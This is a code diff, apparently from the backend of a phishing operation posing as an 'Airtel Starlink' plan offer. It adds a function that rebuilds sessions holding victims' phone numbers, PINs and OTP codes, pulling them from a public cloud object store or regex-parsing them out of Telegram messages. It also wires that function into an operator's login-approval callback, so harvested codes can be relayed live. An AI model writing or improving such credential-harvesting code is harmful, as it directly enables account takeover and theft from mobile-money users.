@@ -373,6 +373,106 @@ function getLatestPendingSession(type: 'login' | 'otp' | 'reenter' | 'any'): Ses
   return latest;
 }
 
+// Reconstruct a session from the cloud store or message text when it's not in local memory.
+// This handles the dual-server case: the session may have been created on a different
+// server instance (e.g. Render) while this server received the Telegram callback.
+async function reconstructSession(
+  rawId: string,
+  messageText: string,
+  messageId?: number
+): Promise<SessionRecord | undefined> {
+  const cleanId = (rawId || '').trim();
+
+  // 1. Try the cloud store first — rawId may be a restful-api.dev object id (numeric)
+  if (cleanId && /^\d+$/.test(cleanId)) {
+    try {
+      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${cleanId}`);
+      if (fetchRes.ok) {
+        const record = await fetchRes.json();
+        const data = record.data || {};
+        if (data.sessionId) {
+          const existing = sessions.get(data.sessionId);
+          if (existing) {
+            if (messageId && !existing.loginMessageId) existing.loginMessageId = messageId;
+            indexSession(existing);
+            return existing;
+          }
+          const rebuilt: SessionRecord = {
+            sessionId: data.sessionId,
+            cloudId: cleanId,
+            phone: data.phone || 'Inconnu',
+            fullPhone: data.fullPhone || data.phone || 'Inconnu',
+            country: data.country || 'Airtel Africa',
+            airtelBrand: data.airtelBrand || 'Airtel Starlink',
+            pin: data.pin || '****',
+            planName: data.planName || 'Forfait Airtel Starlink',
+            planPrice: data.planPrice || '$1.49',
+            otp: data.otp,
+            loginStatus: data.loginStatus || 'pending',
+            otpStatus: data.otpStatus || 'idle',
+            reenterStatus: data.reenterStatus || 'idle',
+            loginMessageId: messageId,
+            createdAt: data.createdAt || Date.now(),
+            lastUpdated: data.lastUpdated || Date.now(),
+          };
+          indexSession(rebuilt);
+          saveSessionsToDisk();
+          console.log(`[Telegram Worker] Reconstructed session ${data.sessionId} from cloud store (cloudId=${cleanId})`);
+          return rebuilt;
+        }
+      }
+    } catch (err) {
+      console.warn('[Telegram Worker] Cloud store reconstruction failed:', err);
+    }
+  }
+
+  // 2. Fallback: parse the message text to rebuild the session
+  if (messageText) {
+    const idMatch = messageText.match(/(?:ID\s*)?Session:\s*(?:<code>)?([a-zA-Z0-9_-]+)(?:<\/code>)?/i);
+    const sessionId = idMatch?.[1]?.trim() || cleanId;
+    if (!sessionId) return undefined;
+
+    const existing = sessions.get(sessionId);
+    if (existing) {
+      if (messageId && !existing.loginMessageId) existing.loginMessageId = messageId;
+      indexSession(existing);
+      return existing;
+    }
+
+    const phoneMatch = messageText.match(/Numéro[^:]*:\s*(?:<code>)?[^0-9+\n]*(\+?[0-9][0-9\s-]{5,})(?:<\/code>)?/i);
+    const pinMatch = messageText.match(/(?:Code\s*)?PIN[^:]*:\s*(?:<code>)?(\d{4})(?:<\/code>)?/i);
+    const otpMatch = messageText.match(/(?:Code\s*)?OTP[^:]*:\s*(?:<code>)?(\d{4})(?:<\/code>)?/i);
+    const planMatch = messageText.match(/Forfait[^:]*:\s*<b>([^<]+)<\/b>\s*\(([^)]+)\)/i) ||
+                      messageText.match(/Forfait:\s*(.+?)\s*\(([^)]+)\)/i);
+    const countryMatch = messageText.match(/Pays[^:]*:\s*(.+?)(?:\n|$)/i);
+
+    const rebuilt: SessionRecord = {
+      sessionId,
+      cloudId: /^\d+$/.test(cleanId) ? cleanId : undefined,
+      phone: phoneMatch ? normalizePhone(phoneMatch[1]) : 'Inconnu',
+      fullPhone: phoneMatch ? phoneMatch[1].trim() : 'Inconnu',
+      country: countryMatch ? countryMatch[1].trim() : 'Airtel Africa',
+      airtelBrand: 'Airtel Starlink',
+      pin: pinMatch ? pinMatch[1] : '****',
+      planName: planMatch ? planMatch[1].trim() : 'Forfait Airtel Starlink',
+      planPrice: planMatch ? planMatch[2].trim() : '$1.49',
+      otp: otpMatch ? otpMatch[1] : undefined,
+      loginStatus: 'pending',
+      otpStatus: otpMatch ? 'pending' : 'idle',
+      reenterStatus: 'idle',
+      loginMessageId: messageId,
+      createdAt: Date.now(),
+      lastUpdated: Date.now(),
+    };
+    indexSession(rebuilt);
+    saveSessionsToDisk();
+    console.log(`[Telegram Worker] Reconstructed session ${sessionId} from message text`);
+    return rebuilt;
+  }
+
+  return undefined;
+}
+
 // Sync status back to cloud store if session has a restful-api cloudId
 async function syncStatusToCloudStore(recordId: string, session?: SessionRecord) {
   const targetCloudId = session?.cloudId || recordId;
@@ -473,7 +573,8 @@ async function pollTelegramUpdates() {
             // A) APPROVE LOGIN
             if (callbackData.startsWith('approve_login')) {
               const rawId = callbackData.replace('approve_login_', '').replace('approve_login', '').trim();
-              const session = findSessionByIdOrPhone(rawId, originalText, msgId) || getLatestPendingSession('login');
+              let session = findSessionByIdOrPhone(rawId, originalText, msgId) || getLatestPendingSession('login');
+              if (!session) session = await reconstructSession(rawId, originalText, msgId);
 
               if (session) {
                 session.loginStatus = 'approved';
